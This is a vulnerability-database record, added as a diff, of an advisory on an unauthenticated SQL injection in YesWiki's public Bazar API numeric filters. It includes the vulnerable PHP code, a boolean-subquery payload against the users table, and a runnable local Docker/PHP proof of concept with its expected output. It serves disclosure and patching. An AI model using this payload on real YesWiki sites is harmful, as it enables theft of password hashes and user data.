@@ -1,0 +1,199 @@
+[id]
+ave_id = "AVE-2026-0371"
+aliases = ["CVE-2026-52770","GHSA-qg78-vmvc-fhjw"]
+
+[basic]
+title = "YesWiki: SQL Injection possible through public Bazar entry-listing APIs via numeric `query`/`queries` filters"
+description = "### Summary
+YesWiki’s public Bazar entry-listing APIs are vulnerable to unauthenticated SQL injection in numeric `query` / `queries` filters.
+
+For Bazar fields whose value structure is numeric, YesWiki escapes the attacker-controlled filter value but inserts it into SQL without quotes or numeric validation. An unauthenticated attacker can inject boolean SQL expressions and infer database contents from whether entries are returned.
+
+### Details
+The public Bazar API reads attacker-controlled query filters from GET parameters:
+
+```php
+// tools/bazar/controllers/ApiController.php
+$vQuery = $_GET['query'] ?? $_GET['queries'] ?? null;
+$vQuery = $vSearchManager->aggregateQueries(
+    !empty($selectedEntries) ? ['queries' => ['id_fiche' => $selectedEntries]] : [],
+    isset($vQuery) ? urldecode($vQuery) : ''
+);
+```
+
+Relevant public routes include:
+
+```php
+@Route(\"/api/forms/{formId}/entries/{output}/{selectedEntries}\", methods={\"GET\"}, options={\"acl\":{\"public\"}})
+@Route(\"/api/entries/{output}/{selectedEntries}\", methods={\"GET\"}, options={\"acl\":{\"public\"}})
+@Route(\"/api/entries/bazarlist\", methods={\"GET\"}, options={\"acl\":{\"public\"}})
+```
+
+The query is passed into `BazarListService::getEntries()` and then into `SearchManager::search()`:
+
+```php
+// tools/bazar/services/BazarListService.php
+$vLocalEntries = $vSearchManager->search(
+    array_merge(
+        $pOptions,
+        [
+            'formsIds' => $vLocalIDs,
+        ]
+    ),
+    true,
+    true
+);
+```
+
+The vulnerable sink is in `SearchManager::buildQueriesConditions()`:
+
+```php
+// tools/bazar/services/SearchManager.php
+if ($vDescriptor['_type_'] == 'number') {
+    if (isset($vValue) && trim($vValue) !== '') {
+        $vValueConditions[] = 'CAST(' . mysqli_real_escape_string($this->wiki->dblink, $this->renameJSONPathVariable($vFieldName)) . ' AS DOUBLE) ' . $vComparisonOperator . ' ' . mysqli_real_escape_string($this->wiki->dblink, $vValue);
+    }
+}
+```
+
+Because numeric values are not quoted, SQL syntax remains active after escaping. For example, the following value is accepted as part of the numeric expression:
+
+```text
+100 OR (SELECT COUNT(*) FROM yeswiki_users)>0
+```
+
+This produces a predicate equivalent to:
+
+```sql
+CAST(bf_age AS DOUBLE) > 100 OR (SELECT COUNT(*) FROM yeswiki_users)>0
+```
+
+Read ACL filtering and Bazar Guard processing do not prevent exploitation because the injected SQL expression is evaluated by the database before returned rows are post-processed.
+
+Numeric Bazar filters are a documented/common feature. The documentation includes examples such as:
+
+```text
+query=\"bf_age>18\"
+query=\"bf_age >= 20 | bf_age < 40\"
+```
+
+Bazar numeric fields are also common through field types such as `number`, `range`, and map latitude/longitude fields.
+
+### PoC
+The following local-only PoC uses the shipped `SearchManager` code with a minimal MariaDB fixture. It demonstrates that a true injected boolean subquery changes the returned entries, while a false subquery does not.
+
+Run from the repository root:
+
+```bash
+set -euo pipefail; name=\"yeswiki-audit-db-$$\"; docker run -d --rm --name \"$name\" -e MARIADB_ROOT_PASSWORD=auditpass -e MARIADB_ROOT_HOST='%' -e MARIADB_DATABASE=yeswiki mariadb:11.4 >/dev/null; trap 'docker rm -f \"$name\" >/dev/null 2>&1 || true' EXIT; until docker exec \"$name\" mariadb-admin ping -h127.0.0.1 -uroot -pauditpass --silent >/dev/null 2>&1; do sleep 1; done; docker run --rm -i --network \"container:$name\" -v \"$PWD:/repo:ro\" --entrypoint php phpmyadmin:5.2.1 -d error_reporting=E_ERROR -d display_errors=1 <<'PHP'
+<?php
+namespace YesWiki\Bazar\Service {
+    class EntryManager { public const TRIPLES_ENTRY_ID = 'yeswiki-entry'; }
+    class FormManager { public function getMany($ids) { return [1 => ['prepared' => [new \DummyNumberField()]]]; } }
+}
+namespace {
+    class DummyNumberField {
+        public function getPropertyName() { return 'bf_age'; }
+        public function getValueStructure() { return ['bf_age' => ['_mode_' => 'single', '_type_' => 'number']]; }
+    }
+    class DummyServices {
+        public function get($class) {
+            if ($class === 'YesWiki\\Bazar\\Service\\FormManager') { return new \YesWiki\Bazar\Service\FormManager(); }
+            if ($class === 'YesWiki\\Bazar\\Service\\EntryManager') { return new \YesWiki\Bazar\Service\EntryManager(); }
+            throw new \RuntimeException('Unexpected service: ' . $class);
+        }
+    }
+    class DummyWiki {
+        public $dblink;
+        public $services;
+        public function __construct($dblink) { $this->dblink = $dblink; $this->services = new DummyServices(); }
+        public function GetConfigValue($name, $default = null) { return $name === 'min_search_keyword_length' ? 3 : $default; }
+        public function UserIsAdmin() { return false; }
+        public function getUserName() { return 'Anonymous'; }
+    }
+    class DummyDbService {
+        public function getCollation(): string { return 'utf8mb4_unicode_ci'; }
+        public function prefixTable($tableName) { return ' yeswiki_' . $tableName . ' '; }
+    }
+    class DummyAclService { public function updateRequestWithACL() { return '1=1'; } }
+
+    require '/repo/tools/bazar/services/SearchManager.php';
+
+    $db = mysqli_connect('127.0.0.1', 'root', 'auditpass', 'yeswiki');
+    if (!$db) { throw new \RuntimeException(mysqli_connect_error()); }
+    mysqli_set_charset($db, 'utf8mb4');
+
+    foreach ([
+        \"CREATE TABLE yeswiki_pages (id INT PRIMARY KEY AUTO_INCREMENT, tag VARCHAR(64), time DATETIME DEFAULT CURRENT_TIMESTAMP, user VARCHAR(64), owner VARCHAR(64), latest CHAR(1), comment_on VARCHAR(64), body JSON)\",
+        \"CREATE TABLE yeswiki_triples (resource VARCHAR(64), value VARCHAR(64), property VARCHAR(128))\",
+        \"CREATE TABLE yeswiki_users (name VARCHAR(64), password VARCHAR(256), email VARCHAR(191))\",
+        \"INSERT INTO yeswiki_users VALUES ('admin', 'dummy_hash_marker', 'secret@example.test')\",
+        \"INSERT INTO yeswiki_pages (tag,user,owner,latest,comment_on,body) VALUES ('EntryA','alice','alice','Y','',JSON_OBJECT('id_typeannonce','1','id_fiche','EntryA','bf_age','10')), ('EntryB','bob','bob','Y','',JSON_OBJECT('id_typeannonce','1','id_fiche','EntryB','bf_age','20'))\",
+        \"INSERT INTO yeswiki_triples VALUES ('EntryA','yeswiki-entry','http://outils-reseaux.org/_vocabulary/type'), ('EntryB','yeswiki-entry','http://outils-reseaux.org/_vocabulary/type')\",
+    ] as $sql) {
+        if (!mysqli_query($db, $sql)) { throw new \RuntimeException(mysqli_error($db) . \" in \" . $sql); }
+    }
+
+    $ref = new \ReflectionClass(\YesWiki\Bazar\Service\SearchManager::class);
+    $sm = $ref->newInstanceWithoutConstructor();
+    foreach (['wiki' => new DummyWiki($db), 'dbService' => new DummyDbService(), 'aclService' => new DummyAclService()] as $prop => $value) {
+        $rp = $ref->getProperty($prop);
+        $rp->setAccessible(true);
+        $rp->setValue($sm, $value);
+    }
+
+    $cases = [
+        'control_no_match' => 'bf_age>100',
+        'boolean_true_subquery' => 'bf_age>100 OR (SELECT COUNT(*) FROM yeswiki_users)>0',
+        'boolean_false_subquery' => 'bf_age>100 OR (SELECT COUNT(*) FROM yeswiki_users WHERE 0)>0',
+    ];
+
+    foreach ($cases as $label => $query) {
+        $params = ['queries' => $query, 'formsIds' => [1]];
+        $sql = $sm->prepareSearchRequest($params, true, false);
+        $result = mysqli_query($db, $sql);
+        if (!$result) { throw new \RuntimeException(mysqli_error($db) . \" in \" . $sql); }
+        $tags = [];
+        while ($row = mysqli_fetch_assoc($result)) { $tags[] = $row['tag']; }
+        sort($tags);
+        printf(\"%s: %d rows [%s]\n\", $label, count($tags), implode(',', $tags));
+        if ($label === 'boolean_true_subquery') {
+            echo \"where_fragment=\" . preg_replace('/^.* WHERE /s', '', $sql) . \"\n\";
+        }
+    }
+}
+PHP
+```
+
+Expected vulnerable output:
+
+```text
+control_no_match: 0 rows []
+boolean_true_subquery: 2 rows [EntryA,EntryB]
+where_fragment=((CAST(bf_age AS DOUBLE) > 100 OR (SELECT COUNT(*) FROM yeswiki_users)>0)) AND 1=1
+boolean_false_subquery: 0 rows []
+```
+
+The no-match control returns no rows. The false injected subquery also returns no rows. The true injected subquery returns rows, proving that attacker-controlled SQL is evaluated inside the numeric filter.
+
+### Impact
+This is an unauthenticated SQL injection vulnerability.
+
+An attacker can use public Bazar API endpoints as a boolean oracle to infer data accessible to the YesWiki database user. This may include user account data, password hashes, password recovery material, private wiki metadata, or other sensitive database contents."
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-23T23:04:40.128144665+00:00"
